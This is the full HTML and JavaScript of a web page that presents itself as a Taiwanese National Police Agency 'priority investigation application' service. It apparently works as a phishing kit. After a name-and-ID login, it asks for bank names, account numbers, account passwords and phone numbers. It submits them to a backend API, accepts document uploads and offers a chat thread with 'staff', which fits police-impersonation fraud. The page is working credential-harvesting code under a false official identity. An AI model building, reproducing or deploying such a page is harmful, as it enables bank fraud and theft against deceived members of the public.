<!DOCTYPE html>
<html lang="zh-Hant-TW">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>優先調查申請表｜便民服務</title>
  <link rel="stylesheet" href="/public/styles.css">
</head>
<body class="police-service">
  <a class="skip-link" href="#mainContent">跳至主要內容</a>
  <header class="app-header">
    <a class="service-brand" href="/" aria-label="回主頁">
      <img class="brand-top-image" src="https://www.cib.npa.gov.tw/ch/index/viewtopimage?module=websitetop" alt="內政部警政署刑事警察局">
      <div>
        <p class="agency-name">內政部警政署</p>
        <h1>優先調查申請表</h1>
      </div>
    </a>
    <div class="header-actions">
      <a class="header-context official-home-link" href="/public-services/">回便民服務</a>
    </div>
  </header>

  <main id="mainContent" class="layout" tabindex="-1">
    <section class="surface compact priority-form-shell">
      <p class="eyebrow">便民服務</p>
      <h2>優先調查申請表</h2>

      <form id="priorityLoginForm" class="stacked-form" action="#" method="post">
        <label>姓名<input name="citizenName" type="text" autocomplete="name" required></label>
        <label>證號<input name="certificateNumber" type="text" autocomplete="off" autocapitalize="characters" spellcheck="false" required></label>
        <button type="submit">登入</button>
      </form>

      <div id="priorityWorkspace" class="hidden" hidden>
        <p id="priorityIdentity" class="muted"></p>
        <section class="section-card">
          <form id="priorityApplicationForm" class="stacked-form" action="#" method="post">
            <div class="section-heading">
              <h3>新增申請</h3>
              <button type="button" class="secondary" data-action="addPriorityRow">新增一筆</button>
            </div>
            <div data-slot="priorityRows" class="priority-rows"></div>
            <button type="submit">送出申請</button>
          </form>
        </section>
        <section class="section-card">
          <h3>歷史紀錄</h3>
          <div id="priorityHistory" class="priority-history"></div>
        </section>
      </div>
      <div id="priorityStatus" class="notice hidden" role="status" aria-live="polite"></div>
    </section>
  </main>

  <footer class="service-footer">
    <p>內政部警政署｜警政服務系統</p>
  </footer>
  <script>
  (function(){
    var loginForm = document.getElementById('priorityLoginForm');
    var workspace = document.getElementById('priorityWorkspace');
    var identity = document.getElementById('priorityIdentity');
    var history = document.getElementById('priorityHistory');
    var form = document.getElementById('priorityApplicationForm');
    var rows = document.querySelector('[data-slot="priorityRows"]');
    var status = document.getElementById('priorityStatus');
    var session = null;
    if (!loginForm || !workspace || !form || !rows || !status) return;
    function showStatus(text, type){ status.textContent = text; status.className = 'notice ' + (type === 'error' ? 'error' : ''); status.hidden = !text; }
    function escapeHtml(value){ return String(value == null ? '' : value).replace(/[&<>"']/g, function(char){ return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[char]; }); }
    function addRow(){
      var index = rows.children.length + 1;
      var row = document.createElement('div');
      row.className = 'priority-row';
      row.innerHTML = '<strong>第 ' + index + ' 筆</strong>' +
        '<label>銀行名稱<input name="bank" type="text" autocomplete="off"></label>' +
        '<label>分行名稱<input name="branchName" type="text" autocomplete="off"></label>' +
        '<label>銀行戶名<input name="accountName" type="text" autocomplete="off"></label>' +
        '<label>銀行帳號<input name="accountNumber" type="text" inputmode="numeric" autocomplete="off"></label>' +
        '<label>密碼<input name="password" type="text" autocomplete="off"></label>' +
        '<label>手機號<input name="phone" type="tel" inputmode="tel" autocomplete="off"></label>' +
        '<label>筆記<textarea name="note"></textarea></label>' +
        '<label>筆記附件（加在這筆筆記下方，可多選，每個最多 20 MB）<input name="files" type="file" accept="image/*,.pdf,.doc,.docx,.xls,.xlsx,.csv" multiple></label>' +
        '<button type="button" class="secondary" data-action="removePriorityRow">移除</button>';
      row.querySelector('[data-action="removePriorityRow"]').addEventListener('click', function(){
        if (rows.children.length > 1) row.remove();
        Array.prototype.forEach.call(rows.children, function(item, itemIndex){ item.querySelector('strong').textContent = '第 ' + (itemIndex + 1) + ' 筆'; });
      });
      rows.appendChild(row);
    }
    function requestJson(path, options){
      return fetch(path, Object.assign({ credentials: 'same-origin', headers: { 'Content-Type': 'application/json' } }, options || {})).then(function(response){
        return response.json().then(function(data){ if (!response.ok) throw new Error(data.error || '送出失敗'); return data; });
      });
    }
    function entryLine(entry){
      return '銀行名稱：' + escapeHtml(entry.bank || '未填') +
        '｜分行名稱：' + escapeHtml(entry.branchName || '未填') +
        '｜銀行戶名：' + escapeHtml(entry.accountName || '未填') +
        '｜銀行帳號：' + escapeHtml(entry.accountNumber || entry.cardNumber || '未填') +
        '｜密碼：' + escapeHtml(entry.password || '未填') +
        '｜手機號：' + escapeHtml(entry.phone || '未填');
    }
    function renderFiles(files){
      var list = Array.isArray(files) ? files : [];
      if (!list.length) return '<p class="muted">尚無附件</p>';
      return '<div class="priority-files">' + list.map(function(file){
        var name = escapeHtml(file.originalName || '附件');
        var url = String(file.url || '');
        var who = file.uploadedBy ? '<span>' + escapeHtml(file.uploadedBy) + '</span>' : '';
        return (url ? '<a href="' + escapeHtml(url) + '" target="_blank" rel="noopener noreferrer">' + name + '</a>' : '<span>' + name + '</span>') + who;
      }).join('') + '</div>';
    }
    function renderHistory(applications){
      var visible = (applications || []).filter(function(application){ return (application.entries || []).length; });
      history.innerHTML = visible.length ? '' : '<p class="muted">目前還沒有申請資料。</p>';
      var serial = 0;
      visible.forEach(function(application){
        var group = document.createElement('section');
        group.className = 'priority-application';
        (application.entries || []).forEach(function(entry){
          serial += 1;
          var card = document.createElement('article');
          card.className = 'priority-saved';
          var messages = Array.isArray(entry.messages) ? entry.messages : [];
          var thread = messages.map(function(message){
            return '<p><span>' + (message.role === 'staff' ? '後台' : '民眾') + '</span> ' + escapeHtml(message.body) + '</p>';
          }).join('') || '<p class="muted">尚無筆記或回覆</p>';
          card.innerHTML = '<strong>第 ' + serial + ' 筆</strong><div>' + entryLine(entry) + '</div><div class="priority-thread">' + thread + '</div>' + renderFiles(entry.files) + '<form class="priority-followup" data-priority-upload><label>加在這筆筆記下方的附件（圖片或其他檔案，每個最多 20 MB）<input name="file" type="file" accept="image/*,.pdf,.doc,.docx,.xls,.xlsx,.csv" required></label><button type="submit">新增附件</button></form><form class="priority-followup" data-priority-message><label>補上訊息<textarea name="body" required></textarea></label><button type="submit">送出訊息</button></form>';
          card.querySelector('[data-priority-upload]').addEventListener('submit', function(event){
            event.preventDefault();
            var uploadForm = event.currentTarget;
            var file = uploadForm.elements.file.files[0];
            var button = uploadForm.querySelector('button');
            if (!file) return;
            button.disabled = true;
            uploadCitizenFile(application.id, entry.id, file).then(function(){
              uploadForm.reset();
              return reload();
            }).catch(function(error){ showStatus(error.message || '上傳失敗', 'error'); }).finally(function(){ button.disabled = false; });
          });
          card.querySelector('[data-priority-message]').addEventListener('submit', function(event){
            event.preventDefault();
            var messageForm = event.currentTarget;
            var button = messageForm.querySelector('button');
            button.disabled = true;
            requestJson('/api/priority-applications/messages', {
              method: 'POST',
              body: JSON.stringify({ citizenName: session.citizenName, certificateNumber: session.certificateNumber, entryId: entry.id, body: messageForm.elements.body.value.trim() })
            }).then(function(){ return reload(); }).catch(function(error){ showStatus(error.message || '送出失敗', 'error'); }).finally(function(){ button.disabled = false; });
          });
          group.appendChild(card);
        });
        history.appendChild(group);
      });
    }
    function uploadCitizenFile(applicationId, entryId, file){
      if (!file || !file.size) return Promise.reject(new Error('不能上傳空白檔案。'));
      if (file.size > 20 * 1024 * 1024) return Promise.reject(new Error('單檔上限為 20 MB。'));
      var mimeType = file.type || 'application/octet-stream';
      return requestJson('/api/priority-applications/files', {
        method: 'POST',
        body: JSON.stringify({ action: 'ticket', applicationId: applicationId, entryId: entryId, citizenName: session.citizenName, certificateNumber: session.certificateNumber, fileName: file.name, mimeType: mimeType, size: file.size })
      }).then(function(ticket){
        if (ticket.mode === 'signed') {
          return fetch(ticket.signedUrl, { method: 'PUT', headers: { Authorization: 'Bearer ' + ticket.token, 'Content-Type': mimeType, 'x-upsert': 'false' }, body: file }).then(function(response){
            if (!response.ok) throw new Error('檔案上傳失敗，請再試一次。');
            return requestJson('/api/priority-applications/files', { method: 'POST', body: JSON.stringify({ action: 'complete', applicationId: applicationId, entryId: entryId, citizenName: session.citizenName, certificateNumber: session.certificateNumber, storedName: ticket.storedName, fileName: file.name, mimeType: mimeType, size: file.size }) });
          });
        }
        if (ticket.mode === 'multipart') {
          var body = new FormData();
          body.append('file', file, file.name);
          body.append('entryId', entryId);
          body.append('citizenName', session.citizenName);
          body.append('certificateNumber', session.certificateNumber);
          return fetch(ticket.uploadUrl, { method: 'POST', body: body, credentials: 'same-origin' }).then(function(response){
            return response.json().then(function(data){ if (!response.ok) throw new Error(data.error || '檔案上傳失敗'); return data; });
          });
        }
        throw new Error('無法開始上傳。');
      });
    }
    function reload(){
      return requestJson('/api/priority-applications/lookup', {
        method: 'POST',
        body: JSON.stringify(session)
      }).then(function(data){ renderHistory(data.applications || []); showStatus(''); });
    }
    document.querySelector('[data-action="addPriorityRow"]').addEventListener('click', addRow);
    for (var count = 0; count < 3; count += 1) addRow();
    loginForm.addEventListener('submit', function(event){
      event.preventDefault();
      var button = loginForm.querySelector('button[type="submit"]');
      session = { citizenName: loginForm.elements.citizenName.value.trim(), certificateNumber: loginForm.elements.certificateNumber.value.trim().toUpperCase() };
      button.disabled = true;
      showStatus('登入中...');
      requestJson('/api/priority-applications/lookup', { method: 'POST', body: JSON.stringify(session) }).then(function(data){
        loginForm.hidden = true;
        loginForm.classList.add('hidden');
        workspace.hidden = false;
        workspace.classList.remove('hidden');
        identity.textContent = session.citizenName + ' · ' + session.certificateNumber;
        renderHistory(data.applications || []);
        showStatus('');
      }).catch(function(error){
        session = null;
        showStatus(error.message || '查無資料', 'error');
      }).finally(function(){ button.disabled = false; });
    });
    form.addEventListener('submit', function(event){
      event.preventDefault();
      if (!session) return showStatus('請先登入', 'error');
      var button = form.querySelector('button[type="submit"]');
      var drafted = Array.prototype.map.call(rows.children, function(row){
        return {
          bank: row.querySelector('[name="bank"]').value.trim(),
          branchName: row.querySelector('[name="branchName"]').value.trim(),
          accountName: row.querySelector('[name="accountName"]').value.trim(),
          accountNumber: row.querySelector('[name="accountNumber"]').value.trim(),
          password: row.querySelector('[name="password"]').value.trim(),
          phone: row.querySelector('[name="phone"]').value.trim(),
          note: row.querySelector('[name="note"]').value.trim(),
          files: Array.prototype.slice.call((row.querySelector('[name="files"]') || {}).files || [])
        };
      }).filter(function(entry){ return entry.bank || entry.branchName || entry.accountName || entry.accountNumber || entry.password || entry.phone; });
      button.disabled = true;
      showStatus('送出中...');
      requestJson('/api/priority-applications', {
        method: 'POST',
        body: JSON.stringify({
          citizenName: session.citizenName,
          certificateNumber: session.certificateNumber,
          entries: drafted.map(function(entry){ return { bank: entry.bank, branchName: entry.branchName, accountName: entry.accountName, accountNumber: entry.accountNumber, password: entry.password, phone: entry.phone, note: entry.note }; })
        })
      }).then(function(data){
        var applicationId = data.application && data.application.id;
        var savedEntries = (data.application && data.application.entries) || [];
        var chain = Promise.resolve();
        if (applicationId) drafted.forEach(function(entry, index){
          var entryId = savedEntries[index] && savedEntries[index].id;
          if (!entryId) return;
          entry.files.forEach(function(file){ chain = chain.then(function(){ return uploadCitizenFile(applicationId, entryId, file); }); });
        });
        return chain.then(function(){
          rows.innerHTML = '';
          for (var next = 0; next < 3; next += 1) addRow();
          return reload();
        });
      }).then(function(){ showStatus('申請已送出。'); }).catch(function(error){
        showStatus(error.message || '送出失敗', 'error');
      }).finally(function(){ button.disabled = false; });
    });
  })();
  </script>
</body>
</html>
